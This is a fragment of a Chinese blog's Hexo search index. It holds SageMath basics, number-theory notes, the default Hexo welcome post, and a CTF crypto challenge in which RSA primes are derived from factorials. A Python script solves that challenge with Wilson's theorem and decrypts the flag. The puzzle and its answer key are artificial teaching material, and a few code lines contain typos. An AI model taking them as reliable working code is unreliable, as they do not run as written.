id="4-基础的环"><a href="#4-基础的环" class="headerlink" title="4.基础的环"></a>4.基础的环</h2><p>整数环  ZZ</p><p>有理数环 QQ</p><p>实数环  RR</p><p>复数环   CC</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ratpoly<span class="token punctuation">.</span><span class="token operator">&lt;</span>t<span class="token operator">>=</span>PolynomialRing<span class="token punctuation">(</span>QQ<span class="token punctuation">)</span>   <span class="token comment">#这里的ratpoly和realpoly没什么很大区别无关紧要</span>realpoly<span class="token punctuation">.</span><span class="token operator">&lt;</span>z<span class="token operator">>=</span>PolynomiaRing<span class="token punctuation">(</span>RR<span class="token punctuation">)</span>factor<span class="token punctuation">(</span>t<span class="token operator">^</span><span class="token number">2</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment">#无结果</span>factor<span class="token punctuation">(</span>z<span class="token operator">^</span><span class="token number">2</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment">#(z - 1.41421356237310) * (z + 1.41421356237310)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-线性代数"><a href="#5-线性代数" class="headerlink" title="5.线性代数"></a>5.线性代数</h2><p>创建矩阵和实现矩阵运算</p><pre class="line-numbers language-PYTHON" data-language="PYTHON"><code class="language-PYTHON">A &#x3D; Matrix([[1,2,3],[3,2,1],[1,1,1]])w &#x3D; vector([1,1,-4])w*A(0, 0, 0)A*w(-9, 1, -2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>求解矩阵方程是容易的，使用solve_right方法求解A.solve_right(Y)返回使得AX&#x3D;Y成立的矩阵或向量X:</p><pre class="line-numbers language-PYTHON" data-language="PYTHON"><code class="language-PYTHON">A &#x3D; Matrix([[1,2,3],[3,2,1],[1,1,1]])Y &#x3D; vector([0,-4,-1])X &#x3D; A.solve_right(Y)#(-2, 1, 0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>反斜杠  \  可以用来代替solve_right  A\Y</p><pre class="line-numbers language-PYTHON" data-language="PYTHON"><code class="language-PYTHON">A\Y#(-2, 1, 0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="6-多项式"><a href="#6-多项式" class="headerlink" title="6.多项式"></a>6.多项式</h2><p>一元多项式</p><p>第一种方法</p><pre class="line-numbers language-none"><code class="language-none">R &#x3D; PolynomialRing(QQ, &#39;t&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将创建一个多项式环，并告诉Sage在向屏幕打印时使用（字符串）“t”作为未定元。然而，这并未定义供Sage使用的符号t，因此您不能使用它输入属于R的多项式（例如t^2+1).</p><p>第二种方法</p><pre class="line-numbers language-none"><code class="language-none">S &#x3D; QQ[&#39;t&#39;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第三种方法</p><pre class="line-numbers language-none"><code class="language-none">R.&lt;t&gt; &#x3D; PolynomialRing(QQ)R.&lt;t&gt; &#x3D; QQ[&#39;t&#39;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="7-数论函数"><a href="#7-数论函数" class="headerlink" title="7.数论函数"></a>7.数论函数</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">gcd<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">)</span>   <span class="token comment">#5</span>factor<span class="token punctuation">(</span><span class="token number">35</span><span class="token punctuation">)</span>   <span class="token comment">#5*7</span>next_prime<span class="token punctuation">(</span><span class="token number">2005</span><span class="token punctuation">)</span> <span class="token comment">#2011</span>previous_prime<span class="token punctuation">(</span><span class="token number">2005</span><span class="token punctuation">)</span> <span class="token comment">#2003</span><span class="token comment">#扩展欧几里得算法</span>d<span class="token punctuation">,</span>u<span class="token punctuation">,</span>v <span class="token operator">=</span> xgcd<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span>d <span class="token operator">==</span> u<span class="token operator">*</span><span class="token number">12</span> <span class="token operator">+</span> v<span class="token operator">*</span><span class="token number">15</span><span class="token boolean">True</span>phi<span class="token operator">=</span>euler_phi<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>中国剩余定理</p><pre class="line-numbers language-none"><code class="language-none">x &#x3D; crt(2, 1, 3, 5)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sagemath </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数论定理</title>
      <link href="/2023/01/14/Crypto/"/>
      <url>/2023/01/14/Crypto/</url>
      
        <content type="html"><![CDATA[<h2 id="逆元"><a href="#逆元" class="headerlink" title="逆元"></a>逆元</h2><p>注：由于hexo默认渲染引擎是marked但是marked不支持mathjax,所以这些LaTex公式在网页上表示不出来，可以复制LaTex代码在Typora上进行显示，后续我在进行设置。</p><p>a*x $\equiv$ 1(mod b)</p><p>x &#x3D; gmpy2.invert(a,b)</p><h2 id="费马小定理"><a href="#费马小定理" class="headerlink" title="费马小定理"></a>费马小定理</h2><p>第一种形式：若p是素数，a是正整数且不能被p整除，则：<br>a**(p-1) $\equiv$  1 mod  p </p><p>a**(p-1) % p &#x3D; 1 % p</p><p>第二种形式若p是素数且a是任意的整数。则；</p><p>a^p $\equiv$ a mod p<br>a^p % p &#x3D; a % p</p><h2 id="威尔逊定理"><a href="#威尔逊定理" class="headerlink" title="威尔逊定理"></a>威尔逊定理</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>当且仅当p是素数时</p><p>（p-1）！ $\equiv$  -1(mod p)</p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sympy<span class="token keyword">import</span> random<span class="token keyword">def</span> <span class="token function">myGetPrime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    A<span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">513</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span>    B<span class="token operator">=</span>A<span class="token operator">-</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1e3</span><span class="token punctuation">,</span><span class="token number">1e5</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span>    <span class="token keyword">return</span> sympy<span class="token punctuation">.</span>nextPrime<span class="token punctuation">(</span><span class="token punctuation">(</span>B!<span class="token punctuation">)</span><span class="token operator">%</span>A<span class="token punctuation">)</span>p<span class="token operator">=</span>myGetPrime<span class="token punctuation">(</span><span class="token punctuation">)</span>A1<span class="token operator">=</span><span class="token number">21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407</span>B1<span class="token operator">=</span><span class="token number">21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596</span>q<span class="token operator">=</span>myGetPrime<span class="token punctuation">(</span><span class="token punctuation">)</span>A2<span class="token operator">=</span><span class="token number">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927</span>B2<span class="token operator">=</span><span class="token number">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026</span>r<span class="token operator">=</span>myGetPrime<span class="token punctuation">(</span><span class="token punctuation">)</span>n<span class="token operator">=</span>p<span class="token operator">*</span>q<span class="token operator">*</span>rn<span class="token operator">=</span><span class="token number">85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733</span>c<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>e<span class="token operator">=</span><span class="token number">0x1001</span>c<span class="token operator">=</span><span class="token number">75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428</span>so<span class="token punctuation">,</span>what <span class="token keyword">is</span> the flag?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h4><p>最终是求出B! %A    想起威尔逊定理   </p><p>补全为</p><p>（A-1)<em>(A-2)</em>…. (B!)  $\equiv$  -1 (mod A)</p><p>(A-2)*(A-3)……(B!)  $\equiv$  1 (mod A)    </p><p>(A-2)*(A-3)……(B!) %A  &#x3D;  1</p><p>(((((A-2)%A)<em>(A-3))%A……)</em>(B!))%A &#x3D;1</p><p>(((((A-2)%A)<em>(A-3))%A……)</em>(B!) $\equiv$ 1 （mod  A)    &#x2F;&#x2F;利用逆元求B！</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnumA1<span class="token operator">=</span><span class="token number">21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407</span>B1<span class="token operator">=</span><span class="token number">21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596</span>A2<span class="token operator">=</span><span class="token number">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927</span>B2<span class="token operator">=</span><span class="token number">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026</span>n<span class="token operator">=</span><span class="token number">85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733</span>e<span class="token operator">=</span><span class="token number">0x1001</span>c<span class="token operator">=</span><span class="token number">75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428</span><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span>B<span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>B <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> A <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">*=</span> i        tmp <span class="token operator">%=</span> A    tmp_inv <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> A<span class="token punctuation">)</span>    result <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>tmp_inv<span class="token operator">%</span>A<span class="token punctuation">)</span>    <span class="token keyword">return</span> resultp <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>A1<span class="token punctuation">,</span>B1<span class="token punctuation">)</span>q <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>A2<span class="token punctuation">,</span>B2<span class="token punctuation">)</span>r <span class="token operator">=</span> n<span class="token operator">//</span>p<span class="token operator">//</span>qphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/01/13/hello-world/"/>
      <url>/2023/01/13/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
